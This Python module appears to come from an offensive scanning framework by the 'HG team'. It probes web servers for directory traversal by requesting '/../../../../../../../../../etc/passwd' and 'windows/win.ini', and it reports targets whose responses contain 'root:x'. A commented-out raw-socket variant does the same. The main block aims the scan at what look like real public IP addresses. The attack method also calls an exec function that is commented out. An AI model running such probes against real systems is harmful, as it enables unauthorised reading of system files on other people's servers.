# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-09 13:37

# try:
#     s = socket.socket()
#     s.connect((ip, int(80)))
#     flag = "GET /../../../../../../../../../etc/passwd HTTP/1.1\r\n\r\n"
#     s.send(flag)
#     data = s.recv(1024)
#     s.close()
#     if 'root:' in data and 'nobody:' in data:
#         with open('result.txt', 'a+')as aaa:
#             aaa.write('WebServer任意文件读取漏洞 : ' + str(ip) + ':80' + '\n')
# except Exception:
#     pass
# finally:
#     s.close()

# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-08 16:30

from colorama import Fore
from tqdm import tqdm

from exploit.web import BaseScript
from core.MyEnums import *
from core.MyAsyncHttp import *


class Script(BaseScript):
    name = 'Common WEB Server'

    def __init__(self, target, pbar):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bugLevel = BugLevel.HIGH
        # 类型
        self.bugType = BugType.DIRECTORYTRAVERSAL
        # 编号
        self.bugNumber = ''
        # 来源
        self.refer = ''
        # 特定路径判断
        self.detectPathList = ['/../../../../../../../../../etc/passwd', '/../../../../../../../../../windows/win.ini']
        # exec
        # self.execPathList = ['/Conf/jsp/systembulletin/bulletinAction.do']
        # 进度条
        self.pbar = pbar
        # 相关信息
        self.info = 'Directory traversal'

    async def detect(self):
        try:
            # 这个不能允许跳转，可能就是在没有302之前才会展现，一般302的原因也就是权限进行验证之类的跳转操作
            async with aiohttp.ClientSession() as session:
                for detectPath in self.detectPathList:
                    url = f'http://{self.target}{detectPath}' if self.target.startswith(
                        ('http:', 'https:')) is False else f'{self.target}{detectPath}'
                    async with session.get(url=url, timeout=10, verify_ssl=False, allow_redirects=False) as response:
                        if response is not None:
                            text = await response.text()
                            await asyncio.sleep(2)
                            if 'extensions' in text or 'root:x' in text:
                                self.flag = True
                                tqdm.write(Fore.RED + '[{}] {}'.format('Common WEB Server Directory traversal', url))
                                return {'name': 'Common WEB Server Directory traversal', 'url': url, 'software': 'Common WEB Server'}
        except Exception:
            return None

    # async def exec(self):
    #     try:
    #         async with aiohttp.ClientSession() as session:
    #             for execPath in self.execPathList:
    #                 url = f'http://{self.target}{execPath}' if self.target.startswith(
    #                     ('http:', 'https:')) is False else f'{self.target}{execPath}'
    #                 async with session.get(url=url, timeout=10, verify_ssl=False) as response:
    #                     if response is not None:
    #                         text = await response.text()
    #                         await asyncio.sleep(2)
    #                         if 'It works!' in text:
    #                             tqdm.write(Fore.RED + '[{}] {}'.format('FineReport RCE', url))
    #                             return {'name': 'FineReport RCE', 'url': url, 'software': 'FineReport'}
    #     except Exception:
    #         return None

    async def attack(self, semaphore):
        async with semaphore:
            a = await self.detect()
            if a is not None:
                self.vulList.append(a)
            if self.flag:
                b = await self.exec()
                if b is not None:
                    self.vulList.append(b)
        self.pbar.update(1)
        return self.vulList


if __name__ == '__main__':
    # import requests
    # import hashlib
    # resp = requests.get('https://50.84.113.154:8443/favicon.ico', verify=False)
    # if resp.status_code == 200:
    #     m1 = hashlib.md5()
    #     m1.update(resp.content)
    #     theMD5 = m1.hexdigest()
    #     print(theMD5)

    semaphore = asyncio.Semaphore(500)
    sc = Script('61.150.65.205:9999', 1)
    l = asyncio.get_event_loop()
    l.run_until_complete(sc.attack(semaphore))
